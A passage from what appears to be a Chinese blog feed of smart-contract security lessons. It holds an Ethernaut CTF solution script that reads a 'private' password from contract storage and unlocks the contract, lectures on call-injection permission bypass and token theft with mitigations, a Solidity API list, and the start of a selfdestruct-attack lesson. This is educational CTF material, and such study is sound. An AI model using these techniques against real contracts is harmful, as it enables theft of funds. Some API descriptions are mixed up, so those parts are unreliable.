class="hljs-property">providers</span>.<span class="hljs-title class_">AlchemyProvider</span>(<span class="hljs-string">&quot;maticmum&quot;</span>,<span class="hljs-variable constant_">APIKEY</span>);<br><br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&quot;attack the private password&quot;</span>,<span class="hljs-function">()=&gt;</span>&#123;<br><br>    <span class="hljs-title function_">it</span>(<span class="hljs-string">&quot;the eighth example of ethernaut&quot;</span>,<span class="hljs-title function_">async</span>()=&gt;&#123;<br>         <span class="hljs-comment">//调用合约需要singer</span><br>         <span class="hljs-keyword">const</span> [singer] = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>();<br>         <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(singer.<span class="hljs-property">address</span>);<br>        <span class="hljs-comment">//得到合约私有变量</span><br>        <span class="hljs-comment">//在之前的学习中，我们推出了password的所在槽位数为1，因此传入1</span><br>         <span class="hljs-keyword">const</span> password = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getShortStr</span>(<span class="hljs-number">1</span>,ethernaut8_address);<br>         <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;the password is:\n&quot;</span>,password);<br><br>         <span class="hljs-comment">//实例化合约实例</span><br>         <span class="hljs-keyword">const</span> instance8 = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">Contract</span>(ethernaut8_address,ethernaut8_abi,provider);<br><br>         <span class="hljs-comment">//测试账户调用合约unlock方法并传入破解变量</span><br>         <span class="hljs-keyword">await</span> instance8.<span class="hljs-title function_">connect</span>(singer).<span class="hljs-title function_">unlock</span>(password)<br>         <br>         <span class="hljs-comment">//查看合约是否解锁成功</span><br>         <span class="hljs-keyword">const</span> result = utils.<span class="hljs-title function_">toUtf8String</span>(<span class="hljs-keyword">await</span> instance8.<span class="hljs-property">locked</span>);<br>         <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;the contract lock is&quot;</span>,result);<br><br><br>    &#125;)<br>&#125;)<br><br><br><span class="hljs-comment">//获取槽位数据方法函数</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getShortStr</span>(<span class="hljs-params">slot, contractAddress</span>) &#123;<br>    <span class="hljs-keyword">const</span> paddedSlot = utils.<span class="hljs-title function_">hexZeroPad</span>(slot, <span class="hljs-number">32</span>);<br>    <span class="hljs-comment">//获取该槽位最原始数据</span><br>    <span class="hljs-keyword">const</span> storageLocation = <span class="hljs-keyword">await</span> provider.<span class="hljs-title function_">getStorageAt</span>(contractAddress, paddedSlot);<br><br>    <span class="hljs-keyword">return</span> storageLocation;<br> &#125;  <br><br></code></pre></td></tr></table></figure><h3 id="⭐破解代码环境配置"><a href="#⭐破解代码环境配置" class="headerlink" title="⭐破解代码环境配置"></a>⭐破解代码环境配置</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//配置脚本</span><br><span class="hljs-keyword">const</span> e = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./test/export&quot;</span>)<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@nomicfoundation/hardhat-toolbox&quot;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">solidity</span>: <span class="hljs-string">&quot;0.8.0&quot;</span>,<br><br>  <span class="hljs-attr">networks</span>: &#123;<br>    <span class="hljs-comment">//马蹄链测试网</span><br>    <span class="hljs-attr">mumbai</span>:&#123;<br>      <span class="hljs-attr">url</span>:e.<span class="hljs-property">MUMBAI_URL</span>,<br>      <span class="hljs-attr">accounts</span>: [<span class="hljs-string">`0x<span class="hljs-subst">$&#123;e.PRIVATE_KEY&#125;</span>`</span>]<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="⭐运行脚本命令"><a href="#⭐运行脚本命令" class="headerlink" title="⭐运行脚本命令"></a>⭐运行脚本命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npx hardhat <span class="hljs-built_in">test</span> --network mumbai<br></code></pre></td></tr></table></figure><h3 id="🚀破解私有变量成功"><a href="#🚀破解私有变量成功" class="headerlink" title="🚀破解私有变量成功"></a>🚀破解私有变量成功</h3><p><img src="/2022/11/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E5%9B%9B%E8%AE%B2-%E7%A0%B4%E8%A7%A3%E7%A7%81%E6%9C%89%E5%8F%98%E9%87%8F/2.png"></p><h3 id><a href="#" class="headerlink" title></a></h3><p><strong>ethernaut通关截图</strong></p><p><img src="/2022/11/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E5%9B%9B%E8%AE%B2-%E7%A0%B4%E8%A7%A3%E7%A7%81%E6%9C%89%E5%8F%98%E9%87%8F/3.png"></p><h3 id="👨‍💻深度练习-课后作业"><a href="#👨‍💻深度练习-课后作业" class="headerlink" title="👨‍💻深度练习(课后作业)"></a>👨‍💻深度练习(课后作业)</h3><p>这是ethernaut的第12个例子~</p><p>现在把需求交给你：<mark>解锁该合约！！即让 locked &#x3D; false。</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true;<br>  uint256 public ID = block.timestamp;<br>  uint8 private flattening = 10;<br>  uint8 private denomination = 255;<br>  uint16 private awkwardness = uint16(now);<br>  bytes32[3] private data;<br><br>  constructor(bytes32[3] memory _data) public &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br><br>  /*<br>    A bunch of super advanced solidity algorithms...<br><br>      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`<br>      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,<br>      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\<br>      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)<br>      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU<br>  */<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这道练习比前面那道有含金量多了，需要答案可以访问我的个人博客来联系我！</p></blockquote><p>这是我通过的交易hash(马蹄链测试网mumbai): <code>0xb5a6262202503ef74de1a98a870513fb8732a01bf23835db8f5ec39f71927866</code></p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://docs.ethers.io/v5/api/utils/strings/#Bytes32String">ethers.js-Strings-Bytes32String</a></p><p><a href="https://betterprogramming.pub/solidity-storage-variables-with-ethers-js-ca3c7e2c2a64">Solidity Storage Variables with Ethers.js</a></p><p><a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html">状态变量在储存中的布局 — Solidity中文文档</a></p><p><a href="https://learnblockchain.cn/article/4629">Ethernaut 题库闯关 #8 — Vault (learnblockchain.cn)</a></p><p><a href="https://learnblockchain.cn/article/4651">Ethernaut 题库闯关 #12 — Privacy(learnblockchain.cn)</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链骇客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计 私有变量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出以太坊虚拟机</title>
    <link href="/2022/11/05/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <url>/2022/11/05/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>p</p><blockquote><p>以太坊虚拟机：是用来执行以太坊上的交易，提供智能合约的运行环境</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>底层原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>区块链 虚拟机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最全！Solidity全局变量及API</title>
    <link href="/2022/11/04/Solidity%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8F%8AAPI/"/>
    <url>/2022/11/04/Solidity%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8F%8AAPI/</url>
    
    <content type="html"><![CDATA[<h2 id="1-区块和交易属性API"><a href="#1-区块和交易属性API" class="headerlink" title="1. 区块和交易属性API"></a>1. 区块和交易属性API</h2><ol><li><code>blockhash(uint blockNumber)</code></li><li><code>block.coinbash(address)</code></li><li><code>block.difficulty(uint) </code>获得当前区块难度</li><li><code>block.gaslimit(uint)</code></li><li><code>block.number(uint)</code></li><li><code>block.timestamp(uint)</code></li><li><code>gasleft() returns(uint256)</code></li><li><code>msg.data(bytes)</code></li><li><code>msg.sender(address)</code></li><li><code>msg.sig(byte4) </code>调用函数的标识符</li><li><code>msg.value(uint)</code></li><li><code>tx.gasprice(uint)</code></li><li><code>tx.origin(address paybale)</code> 交易起始发送者</li></ol><h2 id="2-ABI编码以及解码函数API"><a href="#2-ABI编码以及解码函数API" class="headerlink" title="2. ABI编码以及解码函数API"></a>2. ABI编码以及解码函数API</h2><ol><li><p><code>abi.encode(bytes memory data,(...)) returns (...)</code>对给定的数据进行ABI解码，数据的类型又括号中的第二个参数给出。</p><p>for example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(uint a,uint[2] memory b,bytes memory c) = abi.decode(data,(uint,uint[2],bytes))<br></code></pre></td></tr></table></figure></li><li><p><code>abi.decode(...) returns (bytes)</code>对给定参数进行ABI编码，即上一个方法反向操作。</p></li><li><p><code>abi.encodePacked(...) returns (bytes)</code> 对给定参数进行ABI编码，不同的是：decode()函数会把参数填充到32字节长度，而该函数编码的参数会紧密地拼在一起。</p></li><li><p><code>abi.encodeWithSelector(bytes4 selector, ...) returns (bytes) </code>从第二个参数开始ABI编码并在前面加上给定地函数选择器<code>selector</code></p></li><li><p><code>abi,encodeWithSignature(string signature, ...) returns (bytes)</code> 等价于 <code>abi.encodeWithSelector(bytes4(keccak256(signature)), ...) </code></p><p>for example</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">payable(attackedContract).call(<br>           abi.encodeWithSignature(<br>               &quot;withdraw(uint256)&quot;,<br>               address(attackedContract).balance<br>           ));<br></code></pre></td></tr></table></figure><p>等同于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">payable(attackedContract).call(<br>             abi.encodeWithSelector(<br>                bytes4(keccak256(&quot;withdraw(uint256)&quot;)),<br>                address(attackedContract).balance<br>            ));<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-数学和密码学函数API"><a href="#3-数学和密码学函数API" class="headerlink" title="3. 数学和密码学函数API"></a>3. 数学和密码学函数API</h2><ol><li><p><code>addmod(uint x,uint y, uint k) returns (uint)</code>计算(x+y) % k，即先求和再求模，求和可以在任意精度下执行，和可以超过2的256次，会对k!&#x3D;0做检查。</p></li><li><p><code>mulmod(uint x,uint y, uint k) returns (uint)</code> 计算(x*y) % k，即先乘再求模，同样可以在任意精度下执行，会对k!&#x3D;0做检查。</p></li><li><p><code>keccak256(bytes memory) returns (bytes32)</code>用Keccak-256算法计算哈希。</p></li><li><p><code>sha256(bytes memory) returns (bytes32)</code> 计算SHA-256的哈希。</p></li><li><p><code>ripemd160(bytes memory) returns (bytes20)</code> 计算参数的RIPEMD-160哈希。</p></li><li><p><code>ecrecover(bytes32 hash, uint8 v, byte32 r, bytes32 s) returns (address)</code> 通过椭圆曲线签名恢复与公钥地址。</p><p>r：签名的前32个字节；</p><p>s：签名的第二个32个字节</p><p>v：签名的最后一个字节；</p></li></ol><p><strong>参考书籍</strong></p><ul><li>智能合约技术与开发 - 熊丽兵</li></ul>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>智能合约 基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链骇客第三讲-Call注入攻击</title>
    <link href="/2022/11/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%B8%89%E8%AE%B2-Call%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <url>/2022/11/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%B8%89%E8%AE%B2-Call%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<blockquote><p> 2018年6月20日，ATN代币团队发布《ATN抵御黑客攻击的报告》，报告指出黑客利用call注入攻击漏洞修改合约拥有者，然后给自己发行代币，从而造成 ATN 代币增发，造成数千万美金的损失。</p><p><code>call()</code>函数，对于写合约的人来说并不陌生，对合约感兴趣的呢更是必备了解。</p></blockquote><h2 id="📕call-函数的特性"><a href="#📕call-函数的特性" class="headerlink" title="📕call( ) 函数的特性"></a>📕call( ) 函数的特性</h2><blockquote><p>研究一个函数的攻击点，要从它的特性下手。</p></blockquote><p>call()是调用第三方合约函数的底层接口，有两种方式可以调用它：</p><blockquote><p>方式一：call(方法选择器, arg1, arg2, …) </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract A&#123;<br><br>    address public owner;<br>   <br>    constructor()&#123;<br>     owner = msg.sender;<br>    &#125;<br>    <br>    modifier onlyOwner()&#123;<br>        require(msg.sender == owner,&quot;only owner can call this func&quot;);<br>        _;<br>    &#125;<br><br>    function useCall() public onlyOwner&#123;<br><br>        (bool ret,) = B.call(abi.encodeWithSignature(&quot;setNum(uint256)&quot;, 10,&quot;12&quot;));<br>    &#125;<br><br>&#125;<br><br>contract B &#123;<br>    <br>    uint256 public num;<br><br>    function setNum(uint256 _num) public &#123; <br>        if(msg.sender != A.owner)&#123;<br>            revert();<br>        &#125;<br>        num = _num;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>方式二：call(bytes)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract A&#123;<br><br>    address public owner;<br>   <br>    constructor()&#123;<br>     owner = msg.sender;<br>    &#125;<br>    <br>    modifier onlyOwner()&#123;<br>        require(msg.sender == owner,&quot;only owner can call this func&quot;);<br>        _;<br>    &#125;<br><br>    function useCall() public onlyOwner&#123;<br><br>        (bool ret,) = B.call(bytes(keccak256(&quot;setNum(uint256)&quot;)),10,&quot;12&quot;);<br>    &#125;<br><br>&#125;<br><br>contract B &#123;<br>    <br>    uint256 public num;<br><br>    function setNum(uint256 _num) public &#123; <br>        if(msg.sender != A.owner)&#123;<br>            revert();<br>        &#125;<br>        num = _num;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>以上两个例子都是在合约A中使用<code>call</code>调用合约B的func()函数。</p><blockquote><p> <strong>需要注意的是</strong>，func()函数只接受一个参数_num，但在调用中我们填入了数字10和字符串”12”这两个参数，但call()将会识别过滤掉多余的参数，将数字10作为调用参数。</p><p>这便是该call的第一个特性！</p></blockquote><h3 id="⚽特性一"><a href="#⚽特性一" class="headerlink" title="⚽特性一"></a>⚽特性一</h3><p>call()可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行;</p><p>并且call()函数能够自动过滤掉多余的参数。</p><blockquote><p>再回到上面的两个例子，在setNum()函数中我加了一个判断 <code>if(msg.sender != A.owner)</code>来确定调用者是否为合约B的拥有者，实际上调用者一定会是合约B的拥有者，这便是call()的第二个重要特性。</p></blockquote><h3 id="⭐特性二（重要）"><a href="#⭐特性二（重要）" class="headerlink" title="⭐特性二（重要）"></a>⭐特性二（重要）</h3><p>在call()调用的过程中，Solidity中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：</p><ul><li>调用发起的地址(msg.sender)</li><li>交易金额(msg.value)</li><li>被调用函数标识符(msg.sig)</li></ul><p>使用call()进行跨合约的函数调用后，<mark>内置变量 <code>msg</code> 的值会修改为调用者，执行环境为被调用者的运行环境</mark>。</p><h2 id="利用call-特性"><a href="#利用call-特性" class="headerlink" title="利用call( ) 特性"></a>利用call( ) 特性</h2><p>利用call函数的特性，可以在特定的场景中触发巨大安全漏洞。</p><ul><li>一是<mark>权限绕过</mark></li><li>二是<mark>代币窃取</mark></li></ul><h3 id="🥁经典攻击模型——权限绕过"><a href="#🥁经典攻击模型——权限绕过" class="headerlink" title="🥁经典攻击模型——权限绕过"></a>🥁经典攻击模型——权限绕过</h3><blockquote><p>这是一个非常经典的攻击模型（现实中将会复杂数倍，但结构相同）；</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract CallBug&#123;<br><br>    function callFunc(bytes data) public&#123;<br>        this.call(data);<br>    &#125;<br>    <br>    //内部转账函数<br>    function authorityTranser(uint256 _amount) internal&#123;<br>        //该方法要求调用者是本合约<br>        require(this == msg.sender);<br>        <br>        //一系列转账操作...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol><li>在某些情况下，合约将会预留一个接口函数 <code>callFunc</code> 方便后续操作，我们可以利用 <mark>特意构造好的字节数据</mark> 传入<code>callFunc</code>接口调用<code>authorityTranser() </code> 转账函数；</li><li>利用<mark>特性二</mark>: <code>msg.sender</code> 此时会等于 <code>this.address</code>，使我们成功绕过<code>require(this == msg.sender);</code></li><li>发生一系列转账操作；</li></ol><h4 id="example"><a href="#example" class="headerlink" title="example"></a><strong>example</strong></h4><p>调用callFunc传入参数：<code>bytes(keccak256(&quot;authorityTranser(uint256)&quot;), 1)</code></p><h3 id="🥁经典攻击模型——代币窃取"><a href="#🥁经典攻击模型——代币窃取" class="headerlink" title="🥁经典攻击模型——代币窃取"></a>🥁经典攻击模型——代币窃取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract CallBug&#123;<br>    function transfer(address _to, uint256 _value) public &#123;<br>        require(_value &lt;= balances[msg.sender]);<br>        balances[msg.sender] -= _value;<br>        balances[_to] += _value;<br>    &#125;<br><br>    function callFunc(bytes data) public &#123;<br>        this.call(data);<br>        //this.call(bytes4(keccak256(&quot;transfer(address,uint256)&quot;)), target, value); //利用代码示意<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="攻击思路同上"><a href="#攻击思路同上" class="headerlink" title="攻击思路同上"></a>攻击思路同上</h3><h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a><strong>example</strong></h4><p>调用callFunc传入参数：<code>bytes(keccak256(&quot;authorityTranser(uint256)&quot;), 1)</code></p><h2 id="预防安全漏洞"><a href="#预防安全漏洞" class="headerlink" title="预防安全漏洞"></a>预防安全漏洞</h2><ol><li><p>call调用的自由度极大，并且call会发生msg值的改变，需要谨慎的使用这些底层的函数；同时在使用时，需要对调用的合约地址、可调用的函数做严格的限制。</p></li><li><p>call调用会改变msg的值，会修改msg.sender为调用者合约的地址，所以在合约中不能轻易将合约本身的地址作为可信地址。</p></li><li><p>如果合约逻辑无法避免跨合约的函数调用，可以采用 <code>new</code> 合约，并指定 <code>function_selector</code> 的方式，指定调用的合约及合约方法，并做好函数参数的检查。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">constructor() &#123;<br>      b =  new  B();<br>  &#125;<br></code></pre></td></tr></table></figure><h2 id="🚀扩展阅读"><a href="#🚀扩展阅读" class="headerlink" title="🚀扩展阅读"></a>🚀扩展阅读</h2><h3 id="ERC223"><a href="#ERC223" class="headerlink" title="ERC223"></a><a href="https://github.com/Dexaran/ERC223-token-standard">ERC223</a></h3><blockquote><p>ERC223标准中解决了很多ERC20标准中一些潜在的问题，同时该标准也代入了Call注入问题。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//例如ERC223的转账函数<br>    function transfer(address to,uint value,bytes data,string custom_fallback) public returns (bool success)&#123;<br>    _transfer(msg.sender,to,value,data);<br><br>    if(isCoontract(to))&#123;<br>        ContractReceiver rx = ContractReceiver(to);<br>        require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)),msg.sender,value,data),&quot;not success!&quot;);<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>  require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)),msg.sender,value,data),&quot;not success!&quot;);</code>就是对call注入攻击的预防判断；</p>]]></content>
    
    
    <categories>
      
      <category>区块链骇客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计 call注入攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链骇客第二讲:被禁用的自毁函数</title>
    <link href="/2022/11/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/"/>
    <url>/2022/11/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-What？"><a href="#1-What？" class="headerlink" title="1. What？"></a>1. What？</h2><blockquote><p>在区块链中删除代码的<mark>唯一方法</mark>是该地址的合约执行自毁操作，即 <mark>selfdestruct</mark>()。</p><p>存储在该地址的剩余以太被发送到指定目标，然后从该状态中删除存储和代码。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Example&#123;<br>    constructor(address payable to) payable &#123;<br>        // redirect all the `msg.value` to `to` when selfdestructing<br>        selfdestruct(to);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>如上例所示，这是一个包含着<code>selfdestruct()</code>函数的简单合约。</p><p><code>constructor</code> 构造器，<code>payable</code>关键词使得该合约在被创建时就能够接收以太</p><p><code>selfdestruct()</code>自毁函数，合约在创建之时，就直接自毁，删除代码，并且将合约本身的余额<mark>强制</mark>发送到<code>to</code>这个地址上；</p><h3 id="说的简单点，自毁函数只有两个核心作用"><a href="#说的简单点，自毁函数只有两个核心作用" class="headerlink" title="说的简单点，自毁函数只有两个核心作用"></a>说的简单点，自毁函数只有两个核心作用</h3><ol><li>它使合约变为无效，有效地删除该地址的字节码。</li><li>它把合约的所有资金<mark>强制</mark>发送到目标地址。</li></ol><h2 id="2-Why？"><a href="#2-Why？" class="headerlink" title="2. Why？"></a>2. Why？</h2><blockquote><p>或许你对我上一部分举出的合约例子可能会感到疑惑，为什么不说得简洁一些呢？</p><p>那到底为什么要禁用自毁函数呢？</p><p>答案就在这个例子中！</p></blockquote><p><strong>这是一个具有攻击性的自毁合约；</strong></p><p>刚刚说到，当调用自毁函数之时，合约余额将会被强制发送指定的地址上。</p><p>注意<mark>强制</mark>这一个词，这意味着接收地址合约无论是否拥有接收以太的函数，它都无法拒绝这笔余额打进来。</p><p><strong>而这正是自毁函数被禁用的原因</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>//被攻击合约<br>contract Attacked &#123;<br>    //部署时传入0.08 ether<br>    constructor() payable &#123;&#125;<br><br>    //获取合约余额<br>    function getBalance() public view returns (uint256 balance) &#123;<br>        balance = address(this).balance;<br>        return balance;<br>    &#125;<br><br>    //提款函数<br>    function withdraw(uint256 amount) external &#123;<br>        require(address(this).balance &gt; 0.1 ether);<br>        require(amount &lt;= address(this).balance);<br>        payable(msg.sender).transfer(address(this).balance);<br>    